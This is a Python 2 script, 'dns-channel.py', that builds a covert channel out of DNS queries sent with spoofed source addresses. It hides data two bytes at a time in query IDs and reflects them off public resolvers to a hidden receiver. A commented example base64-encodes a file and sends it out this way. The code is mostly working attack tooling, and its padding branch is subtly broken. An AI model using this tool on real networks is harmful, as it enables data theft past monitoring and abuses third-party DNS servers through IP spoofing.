#!/usr/bin/python2
import binascii
import socket
import random
import base64
from time import sleep
from scapy.all import UDP
from scapy.all import IP
from scapy.all import Raw
from scapy.all import send

###############################
# dns-channel.py              #
# ----------------------------#
# Covert communications with  #
# DNS packets and IP spoofing #
# ----------------------------#
###############################

###############################
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
#!! This script must be run !!#
#!! with `sudo` or as root. !!#
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
###############################

keyshex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'] # for hex conversion
dns_servers = [] # accessible dns servers
domains = [] # domains to look up
sleep_delay = 0.8 # by default, sleep for 0.8 seconds between packets to control data rate and account for lack of guaranteed arrival order.

"""
 build list of DNS servers and domain names
 based on configuration files.
 lines starting with (or containing) '#' are ignored
 - avail-domains.txt: domain names to build into query
 - avail-dns-servers.txt: DNS servers to query
"""
def setup():
	try:
		f = open("./avail-domains.txt")
		for line in f.readlines():
			if '#' not in line:
				domains.append(line.strip())
		f.close()
	except:
		print "Error while importing domains from avail-domains.txt."
	if len(domains) == 0:
		print "!!!WARNING!!! no domains loaded in config.  Defaulting to example.com."
		domains.append("example.com")
	try:
		f = open("./avail-dns-servers.txt")
		for line in f.readlines():
			if '#' not in line:
				dns_servers.append(line.strip())
		f.close()
	except:
		print "Error importing DNS servers from avail-dns-servers.txt."
	if len(dns_servers) == 0:
		print "!!!WARNING!!! no DNS servers loaded in config.  Defaulting to 8.8.8.8."
		dns_servers.append("8.8.8.8")
	print "Loaded " + str(len(dns_servers)) + " DNS servers."
	print "Loaded " + str(len(domains)) + " domain names."

"""
 send a UDP packet to a server
 supplied message is a hexadecimal string
 and is a valid DNS packet with a spoofed source
"""
def send_udp_message(message, dest, d_port, address, port):
	#address = "192.168.0.1" # LAN testing override
	udp_packet = IP(src=dest, dst=address) / UDP(sport=d_port, dport=53) / Raw(binascii.unhexlify(message))
	send(udp_packet)

# hexify raw data
def rawtobase16(instr):
	outstr = ""
	for byte in instr:
		outstr += keyshex[(ord(byte)>>4)&0x0F]
		outstr += keyshex[ord(byte)&0x0F]
	return outstr

# convert domain to query structure hex(length + name)
def domaintohex(name):
    out = ''
    parts = name.split('.')
    for piece in parts:
        out += '0x{0:0{1}X}'.format(len(piece),2)[2:] # length
        out += rawtobase16(piece) # name part
    return out

# build a random query from our list of domains
def query():
    #00    - zero byte to end the QNAME 
    #00 01 - QTYPE | A records = 1
    #00 01 - QCLASS | internet IN = 1
    return domaintohex(domains[random.randrange(0,len(domains))]) + "0000010001"

"""
 package 2 bytes at a time into a valid DNS query
 using a randomly selected domain name.
 single byte inputs padded with a literal zero.
"""
def package(data):
    #DA TA  - ID
    #01 00 - Query parameters
    #00 01 - Number of questions
    #00 00 - Number of answers
    #00 00 - Number of authority records
    #00 00 - Number of additional records
    message = ''
    if len(data) > 2:
        print "!!!ERROR!!! Can only package 2 bytes per DNS query."
        exit(1)
	if len(data) == 1:
		data += 0x00 #pad with zero
    message += rawtobase16(data)
    message += "01000001000000000000" #see above
    message += query()
    return message

"""
 main function
 takes a data stream (message) which can be any stream of bytes
 and transmits it to a receiver on a given port by routing
 it through randomly build DNS queries.
 dest - destination IP address in the form "XXX.XXX.XXX.XXX"
 port - destination listening port
"""
def dns_send(dest, port, message):
	while message != '': 
		send_udp_message(package(message[0:2]),
			dest,
			port,
			dns_servers[random.randrange(0,len(dns_servers))],
			53)
		message = message[2:]
		sleep(sleep_delay)

"""

 firewalls, network policies, routers/NATs, or 
 Internet Service Provider filtering may affect
 successful execution of this script.  you should
 verify that your test environment will permit ip
 address spoofing and that there will be no adverse
 consequences in doing so.

 "This software is distributed for educational purposes
 only, and comes with absolutely NO warranty."

"""
if __name__ == "__main__":
	setup()
	destination = "192.168.XXX.XXX" # ip address "XXX.XXX.XXX.XXX"
	port = 4242
	message = None

	#example #1
	# - send an ascii text message
	message = "hello world"

	#example #2	
	# - send a base64 encoded file
	# - packet loss is very possible using this method
	# - this will be _very_ slow for large files	
	#f = open("file.ext", "r")
	#message = base64.b64encode(f.read())
	#f.close()

	dns_send(destination, port, message)

